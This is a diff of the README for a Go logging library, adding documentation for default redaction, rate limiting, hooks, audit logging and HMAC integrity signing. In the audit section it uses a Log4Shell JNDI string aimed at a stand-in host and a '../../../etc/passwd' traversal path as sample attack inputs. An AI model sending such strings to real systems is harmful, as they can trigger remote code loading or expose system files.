@@ -16,11 +16,12 @@ A production-grade high-performance Go logging library with zero external depend
 
 | Feature | Description |
 |---------|-------------|
-| **High Performance** | Minimal allocations (1/op simple logging), buffer pooling, lock-free reads |
+| **High Performance** | Zero-allocation simple logging, buffer pooling, lock-free reads |
 | **Thread-Safe** | Atomic operations + lock-free design, fully concurrent-safe |
-| **Built-in Security** | Sensitive data filtering, injection attack prevention |
+| **Built-in Security** | Sensitive data filtering, injection attack prevention, log rate limiting |
 | **Structured Logging** | Type-safe fields, JSON/text formats, customizable field names |
 | **Smart Rotation** | Auto-rotate by size, auto-compress, auto-cleanup |
+| **Audit Logging** | Security event audit trail with optional HMAC integrity signing |
 | **Zero Dependencies** | Only Go standard library |
 | **Easy to Use** | Get started in 30 seconds with intuitive API |
 | **Cloud-Native** | JSON format compatible with ELK/Splunk/CloudWatch |
@@ -48,7 +49,7 @@ import "github.com/cybergodev/dd"
 
 func main() {
     // Zero setup - use package-level functions
-    dd.Debug("Debug message")
+    dd.Debug("Debug message")  // Hidden by default (level is Info)
     dd.Info("Application started")
     dd.Warn("Cache miss")
     dd.Error("Connection failed")
@@ -110,6 +111,9 @@ logger, err := dd.New(dd.DevelopmentConfig())
 logger, err := dd.New(dd.JSONConfig())
 ```
 
+> All presets enable basic sensitive-data filtering by default (see
+> [Security Features](#security-features)).
+
 ### Custom Configuration
 
 ```go
@@ -131,6 +135,16 @@ if err != nil {
     log.Fatalf("failed to create logger: %v", err)
 }
 defer logger.Close()
+```
+
+Use `cfg.Clone()` to derive independent copies from a base config:
+
+```go
+base := dd.DefaultConfig()
+base.Format = dd.FormatJSON
+
+appCfg := base.Clone() // Deep copy - safe to modify independently
+appCfg.Targets = []dd.OutputTarget{dd.FileOutput("app.log")}
 ```
 
 ### Output Targets
@@ -172,11 +186,15 @@ func main() {
 
     // Re-enable caller info
     cfg.DynamicCaller = true
-    dd.InitDefault(cfg)
+    if err := dd.InitDefault(cfg); err != nil {
+        panic(err)
+    }
 
     dd.Info("With caller info")    // Shows file:line
 }
 ```
+
+Alternatively, build a logger and promote it with `dd.SetDefault(logger)`.
 
 ### JSON Customization
 
@@ -197,27 +215,32 @@ if err != nil {
 }
 ```
 
+> **Note:** `cfg.JSON` is `nil` in `DefaultConfig()` and `DevelopmentConfig()`.
+> Initialize it before customizing: `cfg.JSON = dd.DefaultJSONOptions()`.
+
 ---
 
 ## Security Features
 
 ### Sensitive Data Filtering
 
-```go
-cfg := dd.DefaultConfig()
-cfg.Security = dd.DefaultSecurityConfig()  // Enable basic filtering
+Sensitive-data filtering is **enabled by default** in every preset (`DefaultConfig()`,
+`DevelopmentConfig()`, `JSONConfig()`), using basic patterns:
 
-logger, err := dd.New(cfg)
+```go
+logger, err := dd.New(dd.DefaultConfig()) // Basic filtering already active
 if err != nil {
     log.Fatalf("failed to create logger: %v", err)
 }
 
-// Automatic filtering (basic — DefaultSecurityConfig)
+// Automatic filtering (basic patterns)
 logger.Info("password=secret123")           // -> password=[REDACTED]
 logger.Info("api_key=sk-abc123")            // -> api_key=[REDACTED]
 logger.Info("credit_card=4532015112830366") // -> credit_card=[REDACTED]
 // Email addresses require full filtering: cfg.Security = dd.DefaultSecureConfig()
 ```
+
+To change coverage, replace `cfg.Security` with one of the presets:
 
 | Security Level | Filter Type | Coverage |
 |----------------|-------------|----------|
@@ -232,7 +255,7 @@ Or use `SecurityConfigForLevel()` for programmatic selection:
 ```go
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment) // No filtering
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelBasic)       // Basic
-cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // Standard
+cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // Standard (full filter)
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStrict)      // Strict
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // Maximum
 ```
@@ -240,11 +263,23 @@ cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // Maximum
 ### Custom Patterns
 
 ```go
+// Start from scratch...
 filter := dd.NewEmptySensitiveDataFilter()
 filter.AddPatterns(
     `(?i)internal_token[:\s=]+[^\s]+`,
     `(?i)session_id[:\s=]+[^\s]+`,
 )
+
+// ...or extend the built-in filter
+// filter := dd.NewSensitiveDataFilter()
+// filter.AddPatterns(`(?i)internal_token[:\s=]+[^\s]+`)
+
+// NewCustomSensitiveDataFilter validates patterns up front and returns an error
+filter, err := dd.NewCustomSensitiveDataFilter(
+    `(?i)internal_token[:\s=]+[^\s]+`,
+    `(?i)session_id[:\s=]+[^\s]+`,
+)
+if err != nil { /* invalid pattern */ }
 
 cfg := dd.DefaultConfig()
 cfg.Security = &dd.SecurityConfig{
@@ -256,12 +291,49 @@ if err != nil {
 }
 ```
 
+Filters also support runtime management:
+
+```go
+filter.AddPattern(`(?i)ssn[:\s=]+[^\s]+`) // Add one pattern (validated)
+filter.PatternCount()                      // Number of registered patterns
+filter.ClearPatterns()                     // Remove all patterns
+filter.Disable() / filter.Enable()         // Toggle without losing patterns
+filter.IsEnabled()
+filter.GetFilterStats()                    // dd.FilterStats: scans, matches, drops
+```
+
 ### Disable Security (Max Performance)
 
 ```go
 cfg := dd.DefaultConfig()
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
+// Nil filter = no pattern scanning. Message size / writer caps still apply.
 ```
+
+### Log Rate Limiting
+
+Prevent log flooding under failure cascades (misbehaving components logging in a
+loop). Rate limiting is off by default; enable it via `SecurityConfig`:
+
+```go
+cfg := dd.DefaultConfig()
+cfg.Security.RateLimitConfig = dd.DefaultRateLimitConfig()
+cfg.Security.RateLimitConfig.MaxMessagesPerSecond = 1000 // Default: 10,000
+cfg.Security.RateLimitConfig.MaxBytesPerSecond = 5 << 20 // Default: 10MB
+cfg.Security.RateLimitConfig.Strategy = dd.RateLimitStrategySample // or Drop (default)
+
+logger, err := dd.New(cfg)
+```
+
+| Strategy | Behavior when over limit |
+|----------|--------------------------|
+| `RateLimitStrategyDrop` | Drop excess messages (default) |
+| `RateLimitStrategySample` | Keep 1 in `SamplingRate` messages |
+| `RateLimitStrategyThrottle` | Currently behaves like Drop |
+
+> Fatal-level messages always bypass rate limiting so a fatal log is never
+> silently dropped. With `Config.Audit` configured, over-limit events emit a
+> `RATE_LIMIT_EXCEEDED` audit event.
 
 ---
 
@@ -325,9 +397,9 @@ if err != nil { /* handle error */ }
 
 multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)
 
-cfg := dd.DefaultConfig()
+cfg = dd.DefaultConfig()
 cfg.Targets = []dd.OutputTarget{dd.CustomOutput(multiWriter)}
-logger, err := dd.New(cfg)
+logger, err = dd.New(cfg)
 ```
 
 ### Buffered Writes (High Throughput)
@@ -398,15 +470,19 @@ logger.InfoWith("User action", append(traceFields,
 ```
 
 > **Note:** Always use a valid parent context (e.g., `context.Background()`), never `nil`.
+> Log methods do not accept a context, so context values are **not** picked up
+> automatically — pass them as fields at the call site as shown above.
 
 ### Custom Context Extractors
 
+`ContextExtractors` run for every log entry. They receive `context.Background()`
+(there is no request context to hand them), so use them for process-global
+enrichment only — hostname, service name, environment:
+
 ```go
 tenantExtractor := func(ctx context.Context) []dd.Field {
-    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
-        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
-    }
-    return nil
+    hostname, _ := os.Hostname()
+    return []dd.Field{dd.String("hostname", hostname)}
 }
 
 cfg := dd.DefaultConfig()
@@ -417,6 +493,17 @@ logger, err := dd.New(cfg)
 ---
 
 ## Hooks
+
+Hooks run at well-defined lifecycle points. Register them via `HooksConfig`:
+
+| Hook Event | Triggered when |
+|------------|----------------|
+| `HookBeforeLog` | Before a log entry is written (return an error to **abort** the entry) |
+| `HookAfterLog` | After a log entry is successfully written |
+| `HookOnFilter` | When sensitive data is redacted (carries the field key, never the value) |
+| `HookOnRotate` | When a log file is rotated |
+| `HookOnClose` | When the logger is closed |
+| `HookOnError` | When a write error occurs |
 
 ```go
 hooks := dd.NewHooksFromConfig(dd.HooksConfig{
@@ -443,7 +530,16 @@ hooks := dd.NewHooksFromConfig(dd.HooksConfig{
 cfg := dd.DefaultConfig()
 cfg.Hooks = hooks
 logger, err := dd.New(cfg)
+
+// Register more hooks at runtime
+logger.AddHook(dd.HookOnRotate, func(ctx context.Context, hctx *dd.HookContext) error {
+    fmt.Println("Log rotated")
+    return nil
+})
 ```
+
+> By default, hook execution stops at the first hook error. Set
+> `HooksConfig.ErrorHandler` to run all hooks and route errors to your own handler.
 
 ---
 
@@ -451,12 +547,24 @@ logger, err := dd.New(cfg)
 
 ### Audit Events
 
-```go
-// Create audit logger (default output is os.Stderr)
-auditCfg := dd.DefaultAuditConfig()
-auditCfg.JSONFormat = true
+Attach an audit config to your logger so redactions, rate-limit events, and
+security violations are recorded as signed-or-plain audit events:
 
-auditLogger, err := dd.NewAuditLogger(auditCfg)
+```go
+cfg := dd.DefaultConfig()
+
+auditCfg := dd.DefaultAuditConfig() // JSON to os.Stderr, async buffer of 1000
+cfg.Audit = &auditCfg               // Wire audit events into the logger
+
+logger, err := dd.New(cfg)
+if err != nil { /* handle error */ }
+defer logger.Close()
+```
+
+Or create a standalone audit logger for direct security event reporting:
+
+```go
+auditLogger, err := dd.NewAuditLogger(dd.DefaultAuditConfig())
 if err != nil { /* handle error */ }
 defer auditLogger.Close()
 
@@ -466,7 +574,12 @@ auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "Path traversal block
 auditLogger.LogSecurityViolation("LOG4SHELL", "Pattern detected", map[string]any{
     "input": "${jndi:ldap://evil.com/a}",
 })
+
+// Also available: LogRateLimitExceeded, LogReDoSAttempt, LogIntegrityViolation
+stats := auditLogger.Stats() // Event counts by type
 ```
+
+Use `dd.VerifyAuditEvent(entry, signer)` to verify a previously written audit line.
 
 ### Log Integrity
 
@@ -480,8 +593,11 @@ if err != nil { /* handle error */ }
 
 // Sign log messages
 message := "Critical audit event"
-signature := signer.Sign(message)
+signature := signer.Sign(message) // Format: [SIG:timestamp:sequence:hmac]
 fmt.Printf("Signed: %s %s\n", message, signature)
+
+// Sign a message together with its structured fields
+sigWithFields := signer.SignFields("User login", []dd.Field{dd.String("user_id", "42")})
 
 // Verify signature
 result, err := signer.Verify(message + " " + signature)
@@ -489,6 +605,10 @@ if err == nil && result.Valid {
     fmt.Println("Signature valid")
 }
 ```
+
+> Wire the signer into audit output with `AuditConfig.IntegritySigner = signer`.
+> The signer maintains a monotonically increasing sequence number — see
+> `GetSequence()`, `ResetSequence()`, and `Stats()` for monitoring.
 
 ---
 
@@ -524,6 +644,11 @@ recorder.ContainsMessage("User login")          // true
 recorder.ContainsField("user_id")               // true
 recorder.GetFieldValue("user_id")               // "123"
 recorder.EntriesAtLevel(dd.LevelInfo)           // []LogEntry{...}
+
+// Also available
+recorder.Entries()   // All captured entries
+recorder.Clear()     // Reset between test cases
+recorder.SetFormat(dd.FormatJSON) // Parse output in JSON mode
 ```
 
 ---
@@ -553,14 +678,22 @@ Enforce naming conventions on field keys:
 // Strict snake_case validation
 logger.SetFieldValidation(dd.StrictSnakeCaseConfig())
 
+// Also available: StrictCamelCaseConfig(), DefaultFieldValidationConfig()
+// Conventions: NamingConventionSnakeCase, CamelCase, PascalCase, KebabCase
+
 // Custom validation
 fv := &dd.FieldValidationConfig{
-    Mode:                     dd.FieldValidationStrict,
+    Mode:                     dd.FieldValidationWarn,
     Convention:               dd.NamingConventionSnakeCase,
-    AllowCommonAbbreviations: true,
+    AllowCommonAbbreviations: true, // Accept ID, URL, HTTP, ...
+    EnableSecurityValidation: true, // Log4Shell / homograph detection
 }
 logger.SetFieldValidation(fv)
 ```
+
+> Logging methods do not return errors, so both `Warn` and `Strict` modes emit a
+> diagnostic to stderr and the field is still logged — `Strict` only changes the
+> diagnostic wording. Validation is disabled by default.
 
 ### Dynamic Level Resolution
 
@@ -574,6 +707,32 @@ logger.SetLevelResolver(func(ctx context.Context) dd.LogLevel {
         return dd.LevelWarn  // Reduce logging under high error rate
     }
     return dd.LevelDebug
+})
+```
+
+### Custom Fatal Handler
+
+`Fatal`/`Fatalf` terminate the process via `os.Exit(1)` — deferred functions do
+not run. Use `FatalHandler` to flush and clean up before exit:
+
+```go
+cfg := dd.DefaultConfig()
+var logger *dd.Logger
+cfg.FatalHandler = func() {
+    logger.Close()   // Flush buffered writers
+    os.Exit(1)
+}
+logger, err = dd.New(cfg)
+```
+
+### Write Error Handling
+
+By default, writer errors are silently ignored. Set a handler to route them to
+metrics or a fallback sink:
+
+```go
+logger.SetWriteErrorHandler(func(w io.Writer, err error) {
+    fmt.Fprintf(os.Stderr, "log write failed: %v\n", err)
 })
 ```
 
@@ -594,7 +753,8 @@ defer func() {
 
 ### Debug Utilities
 
-Quick data inspection (writes to stdout, no security filtering):
+Quick data inspection. `Text`/`JSON` write to stdout **without** security
+filtering — never use them with secrets:
 
 ```go
 dd.Text(myStruct)                      // Pretty-printed output
@@ -602,7 +762,15 @@ dd.Textf("Value: %v", data)            // Formatted text
 dd.JSON(myStruct)                      // JSON with caller info
 dd.JSONF("Result: %v", data)           // Formatted JSON
 
-// Also available on logger instances
+// Print family: goes through the default logger (LevelInfo, security filtered)
+dd.Print(myStruct)
+dd.Printf("count=%d", n)
+
+// Exit helpers: print then os.Exit(0) — debug only
+dd.Exit(myStruct)
+dd.Exitf("unreachable: %v", state)
+
+// Text/JSON also available on logger instances
 logger.Text(myStruct)
 logger.JSON(myStruct)
 ```
@@ -613,14 +781,14 @@ logger.JSON(myStruct)
 
 | Operation | Throughput | Memory/Op | Allocs/Op |
 |-----------|------------|-----------|-----------|
-| Simple Logging | ~490K ops/sec | 64 B | 1 |
-| Structured (3 fields) | ~270K ops/sec | 241 B | 4 |
-| JSON Format | ~295K ops/sec | 225 B | 3 |
-| Level Check | ~360M ops/sec | 0 B | 0 |
-| Concurrent (22 goroutines) | ~4.3M ops/sec | 80 B | 1 |
+| Simple Logging | ~3.0M ops/sec | 0 B | 0 |
+| Structured (3 fields) | ~1.5M ops/sec | 104 B | 2 |
+| JSON Format | ~1.4M ops/sec | 64 B | 1 |
+| Level Check | ~310M ops/sec | 0 B | 0 |
+| Concurrent (GOMAXPROCS=22) | ~7M ops/sec | 0 B | 0 |
 
 > Benchmarks use default config (security filtering enabled) writing to
-> `io.Discard`; measured on Intel Core Ultra 9. `Memory/Op` and
+> `io.Discard`; measured on Intel Core Ultra 9 (22 cores). `Memory/Op` and
 > `Allocs/Op` are deterministic; throughput varies by hardware. Run
 > `go test -bench=. -benchmem` to reproduce.
 
@@ -701,6 +869,11 @@ dd.Flush() error
 dd.AddWriter(w io.Writer) error
 dd.RemoveWriter(w io.Writer) error
 dd.WriterCount() int
+
+// Debug utilities (raw stdout, unfiltered — see Debug Utilities above)
+dd.Text(data ...any) / dd.Textf(format string, args ...any)
+dd.JSON(data ...any) / dd.JSONF(format string, args ...any)
+dd.Exit(data ...any) / dd.Exitf(format string, args ...any)  // Print then os.Exit(0)
 ```
 
 ### Logger Methods
@@ -752,6 +925,9 @@ logger.GetSecurityConfig() *SecurityConfig
 logger.ActiveFilterGoroutines() int32
 logger.WaitForFilterGoroutines(timeout time.Duration) bool
 
+// Error handling
+logger.SetWriteErrorHandler(handler WriteErrorHandler)
+
 // Context extractors
 logger.AddContextExtractor(extractor ContextExtractor) error
 logger.SetContextExtractors(extractors ...ContextExtractor) error
@@ -794,6 +970,72 @@ dd.Err(err error)                    // Error field (key: "error")
 dd.ErrWithKey(key string, err error) // Error field with custom key
 dd.ErrWithStack(err error)           // Error with stack trace
 dd.Any(key string, value any)        // Any type
+```
+
+### Security API
+
+```go
+// Preset configs
+dd.DefaultSecurityConfig() // Basic (default in all presets)
+dd.DefaultSecureConfig()   // Full
+dd.HealthcareConfig()      // HIPAA
+dd.FinancialConfig()       // PCI-DSS
+dd.GovernmentConfig()      // Government
+
+// Level-based selection
+dd.SecurityConfigForLevel(level SecurityLevel) *SecurityConfig
+// Levels: SecurityLevelDevelopment, Basic, Standard, Strict, Paranoid
+
+// Sensitive data filters
+filter := dd.NewSensitiveDataFilter()          // Basic patterns
+filter := dd.NewEmptySensitiveDataFilter()     // No patterns
+filter, err := dd.NewCustomSensitiveDataFilter(patterns ...string)
+
+// Filter methods
+filter.AddPattern(pattern string) error
+filter.AddPatterns(patterns ...string) error
+filter.ClearPatterns()
+filter.PatternCount() int
+filter.Enable() / filter.Disable()
+filter.IsEnabled() bool
+filter.GetFilterStats() FilterStats
+filter.WaitForGoroutines(timeout time.Duration) bool
+filter.Close() bool
+
+// Rate limiting
+dd.DefaultRateLimitConfig() *RateLimitConfig
+// Fields: MaxMessagesPerSecond, MaxBytesPerSecond, BurstSize,
+//         Strategy, SamplingRate
+// Strategies: RateLimitStrategyDrop (default), Sample, Throttle
+```
+
+### Audit & Integrity API
+
+```go
+// Audit
+dd.DefaultAuditConfig() AuditConfig
+dd.NewAuditLogger(cfg AuditConfig) (*AuditLogger, error)
+dd.VerifyAuditEvent(entry string, signer *IntegritySigner) *AuditVerificationResult
+
+auditLogger.Log(event AuditEvent)
+auditLogger.LogSensitiveDataRedaction(pattern, field, message string)
+auditLogger.LogRateLimitExceeded(message string, metadata map[string]any)
+auditLogger.LogSecurityViolation(violationType, message string, metadata map[string]any)
+auditLogger.LogReDoSAttempt(pattern, message string)
+auditLogger.LogIntegrityViolation(message string, metadata map[string]any)
+auditLogger.LogPathTraversalAttempt(path, message string)
+auditLogger.Stats() AuditStats
+auditLogger.Close() error
+
+// Integrity
+integrityCfg, err := dd.DefaultIntegrityConfigSafe() // Auto-generated key
+signer, err := dd.NewIntegritySigner(integrityCfg)
+signer.Sign(message string) string
+signer.SignFields(message string, fields []Field) string
+signer.Verify(entry string) (*LogIntegrity, error)
+signer.GetSequence() uint64
+signer.ResetSequence()
+signer.Stats() IntegrityStats
 ```
 
 ### Output Target Helpers
@@ -892,7 +1134,7 @@ See the [examples](examples) directory for complete, runnable examples:
 | [06_context_hooks.go](examples/06_context_hooks.go) | Tracing, hooks |
 | [07_convenience.go](examples/07_convenience.go) | Output targets, quick setup |
 | [08_production.go](examples/08_production.go) | Production patterns |
-| [09_advanced.go](examples/09_advanced.go) | Sampling, validation |
+| [09_advanced.go](examples/09_advanced.go) | Sampling, validation, fatal handler |
 | [10_audit_integrity.go](examples/10_audit_integrity.go) | Audit, integrity |
 | [11_testing.go](examples/11_testing.go) | Testing with LoggerRecorder |
 
